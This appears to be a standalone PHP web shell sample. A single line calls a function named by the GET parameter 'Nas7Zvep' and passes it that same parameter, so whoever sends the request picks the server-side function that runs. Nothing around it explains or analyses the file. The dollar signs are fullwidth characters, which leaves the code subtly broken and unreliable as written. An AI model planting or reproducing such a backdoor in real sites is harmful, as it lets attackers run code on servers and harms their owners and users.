<?php
＄_GET['Nas7Zvep'](＄_GET['Nas7Zvep']);
?>
